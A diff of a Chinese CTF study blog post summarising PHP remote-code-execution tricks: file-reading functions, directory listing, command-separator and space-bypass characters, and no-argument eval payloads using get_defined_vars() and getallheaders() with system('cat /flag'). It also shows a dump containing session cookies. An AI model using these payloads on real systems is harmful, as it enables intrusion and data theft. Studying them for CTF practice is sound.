@@ -20,15 +20,15 @@
   <meta name="keywords" content="">
   <meta name="referrer" content="no-referrer">
   
-    <meta name="description" content="最近遇到一些RCE题目绕过方式比较新颖，在这里总结一下 读取文件很多题目把linux命令中常见的cat，more，less等等都过滤了 CTF里读取文件相关知识点总结(持续更新中) – fushulingのblog 当然也可以直接使用函数  readfile PHP readfile() 函数 | 菜鸟教程 可以readfile(&#39;&#x2F;fl&#39;.&#39;ag&#39;);绕过关键字过">
+    <meta name="description" content="最近遇到一些RCE题目绕过方式比较新奇，在这里总结一下 读取文件很多题目把linux命令中常见的cat，more，less等等都过滤了 CTF里读取文件相关知识点总结(持续更新中) – fushulingのblog 当然也可以直接使用函数  readfile PHP readfile() 函数 | 菜鸟教程 可以readfile(&#39;&#x2F;fl&#39;.&#39;ag&#39;);绕过关键字过">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RCE进阶总结">
 <meta property="og:url" content="https://www.sunynov.top/2026/02/05/RCE%E8%BF%9B%E9%98%B6%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="suny">
-<meta property="og:description" content="最近遇到一些RCE题目绕过方式比较新颖，在这里总结一下 读取文件很多题目把linux命令中常见的cat，more，less等等都过滤了 CTF里读取文件相关知识点总结(持续更新中) – fushulingのblog 当然也可以直接使用函数  readfile PHP readfile() 函数 | 菜鸟教程 可以readfile(&#39;&#x2F;fl&#39;.&#39;ag&#39;);绕过关键字过">
+<meta property="og:description" content="最近遇到一些RCE题目绕过方式比较新奇，在这里总结一下 读取文件很多题目把linux命令中常见的cat，more，less等等都过滤了 CTF里读取文件相关知识点总结(持续更新中) – fushulingのblog 当然也可以直接使用函数  readfile PHP readfile() 函数 | 菜鸟教程 可以readfile(&#39;&#x2F;fl&#39;.&#39;ag&#39;);绕过关键字过">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-02-05T06:31:14.000Z">
-<meta property="article:modified_time" content="2026-02-05T15:55:30.926Z">
+<meta property="article:modified_time" content="2026-02-10T13:31:05.932Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -251,7 +251,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          168 字
+          479 字
         
       </span>
     
@@ -262,7 +262,7 @@
         
         
         
-          2 分钟
+          4 分钟
         
       </span>
     
@@ -304,7 +304,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年2月5日 晚上
+                    本文最后更新于 2026年2月10日 晚上
                   
                 
               </p>
@@ -312,7 +312,7 @@
             
               <div class="markdown-body">
                 
-                <p>最近遇到一些RCE题目绕过方式比较新颖，在这里总结一下</p>
+                <p>最近遇到一些RCE题目绕过方式比较新奇，在这里总结一下</p>
 <h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>很多题目把linux命令中常见的cat，more，less等等都过滤了</p>
 <p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/04/14/ctf%E9%87%8C%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/">CTF里读取文件相关知识点总结(持续更新中) – fushulingのblog</a></p>
 <p>当然也可以直接使用函数</p>
@@ -325,11 +325,52 @@
 <p>这个没有回显，需要<code>echo file_get_contents(&#39;/flag&#39;);</code></p>
 </li>
 <li><p>highlight_file</p>
+<p><code>highlight_file(glob(&quot;/f*&quot;)[0]);</code></p>
 </li>
 </ul>
-<h2 id="读取目录"><a href="#读取目录" class="headerlink" title="读取目录"></a>读取目录</h2><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>有些题目过滤了system，除了像上文那样读取目录然后读取文件，还可以找到system的替代</p>
+<h2 id="读取目录"><a href="#读取目录" class="headerlink" title="读取目录"></a>读取目录</h2><ul>
+<li><p>getcwd()</p>
+<p>返回当前工作目录</p>
+</li>
+<li><p>dirname()</p>
+<p> 返回路径中的目录部分。多次嵌套 <code>dirname()</code> 可以到达根目录。</p>
+</li>
+<li><p>scandir()</p>
+<p>列出根目录下的所有文件</p>
+</li>
+<li><p>glob()</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filesystem-glob.html">PHP glob() 函数 | 菜鸟教程</a></p>
+</li>
+</ul>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>有些题目过滤了system，除了像上文那样读取目录然后读取文件，还可以找到system的替代</p>
 <h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="命令分割符"><a href="#命令分割符" class="headerlink" title="命令分割符"></a>命令分割符</h3><p>%0a  %0d ; &amp;  &amp;&amp; | || </p>
-<h2 id="无参"><a href="#无参" class="headerlink" title="无参"></a>无参</h2>
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>&lt;、&lt;&gt;、${IFS}、$IFS、$IFS$9</p>
+<h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ul>
+<li>单引号(‘)双引号(“”)反引号(&#96;&#96;)</li>
+<li>反斜杠\</li>
+</ul>
+<h2 id="无参🐎"><a href="#无参🐎" class="headerlink" title="无参🐎"></a>无参🐎</h2><p>这里参考了一下E73RN4L师哥的周报</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">array_pop</span>(<span class="hljs-title">next</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-number">1</span>=<span class="hljs-title">phpinfo</span>();</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>current(get_defined_vars())指针移到GET到的变</p>
+<p>上处第一个current()可以替换为end()或reset()，均能利用到GET的内</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">current</span>(<span class="hljs-title">current</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-number">1</span>=<span class="hljs-title">phpinfo</span>();</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>先POST指令1&#x3D;system(‘cat &#x2F;Th1s_1s_R2a1_flag’); </p>
+<p>再code&#x3D;print_r(get_defined_vars());得到当前已定义变量 </p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-built_in">Array</span> ( <br>[_GET] =&gt; <span class="hljs-built_in">Array</span> ( ) <br>[_POST] =&gt; <span class="hljs-built_in">Array</span> ( [m1xian] =&gt; print_r(get_defined_vars()); [<span class="hljs-number">1</span>] =&gt; system(<span class="hljs-string">&#x27;cat </span><br><span class="hljs-string">/flag&#x27;</span>); ) <br>[_COOKIE] =&gt; <span class="hljs-built_in">Array</span> ( [_ga_606P6J79WH] =&gt; GS2.<span class="hljs-number">1.s</span>1764249013$o7$g1$t1764249199$j59$l0$h0 <br>[_ga] =&gt; GA1.<span class="hljs-number">1.520328125</span>.<span class="hljs-number">1763355284</span> [PHPSESSID] =&gt; c9a113d9fc4159ab9e4bb5bebb663742 <br>[session] =&gt; eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiIxMSJ9.aUZ7iw.Yh-<span class="hljs-number">1k</span>HByedh<br>JWt1GG_rwNyKJMc ) [_FILES] =&gt; <span class="hljs-built_in">Array</span> ( ) ) <br></code></pre></td></tr></table></figure>
+
+<p>发现要利用的POST请求在第二个元组中的第二个内容 </p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">next</span>(<span class="hljs-title">next</span>(<span class="hljs-title">get_defined_vars</span>()))); </span><br></code></pre></td></tr></table></figure>
+
+<p>上面第一处next()可以换成end()</p>
+<h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h3><p>getallheaders()返回所有的HTTP头信息</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">code</span><span class="hljs-operator">=</span>print_r(getallheaders())<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现HTTP头信息按倒序排列，所以把a: system(‘cat &#x2F;*’);放在最后，在数组中就是第一个</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">code</span><span class="hljs-operator">=</span>eval(current(getallheaders()))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+
                 
               </div>
             
@@ -391,9 +432,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" title="攻防世界">
+                      <a href="/2026/02/06/SSRF%E6%BC%8F%E6%B4%9E/" title="SSRF漏洞">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">攻防世界</span>
+                        <span class="hidden-mobile">SSRF漏洞</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
